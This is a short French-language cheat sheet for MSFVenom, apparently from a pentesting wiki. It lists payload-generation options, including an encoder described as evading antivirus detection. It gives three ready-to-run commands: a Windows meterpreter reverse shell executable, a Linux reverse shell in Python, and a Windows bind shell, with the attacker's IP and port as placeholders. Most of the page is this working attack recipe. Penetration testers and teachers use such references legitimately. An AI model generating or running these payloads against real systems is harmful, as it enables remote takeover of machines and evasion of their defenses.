---
description: Cheatsheet de la génération de payload ( charge utile ) avec MSFVenom
---

# MSFVenom

<mark style="color:yellow;">**Génération de Payloads avec MSFVenom :**</mark>

`msfvenom -p <payload> [options]`

<mark style="color:yellow;">**Options courantes :**</mark>

* `-p <payload>` : Spécifie le type de payload (ex. windows/meterpreter/reverse\_tcp, linux/x86/shell\_reverse\_tcp).
* `-f <format>` : Spécifie le format de sortie (ex. exe, raw, python, ruby).
* `-o <output>` : Spécifie le fichier de sortie pour la charge utile générée.
* `LHOST=<IP>` : Spécifie l'adresse IP de l'attaquant pour le "reverse shell".
* `LPORT=<port>` : Spécifie le port de l'attaquant pour le "reverse shell" ou le port d'écoute pour le "bind shell".
* `--encoder <encoder>` : Encode la charge utile pour éviter la détection par les antivirus.
* `--platform <platform>` : Spécifie la plateforme cible (ex. Windows, Linux).

<mark style="color:yellow;">**Exemples d'utilisation :**</mark>

1.  <mark style="color:yellow;">Générer un "reverse shell" Windows en format executable :</mark>

    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP de l'attaquant> LPORT=<port> -f exe -o shell.exe`
2.  <mark style="color:yellow;">Générer un "reverse shell" Linux en langage Python :</mark>

    `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP de l'attaquant> LPORT=<port> -f python -o shell.py`
3.  <mark style="color:yellow;">Générer un "bind shell" Windows en format raw :</mark>

    `msfvenom -p windows/shell_bind_tcp LPORT=<port> -f raw -o bind_shell.bin`
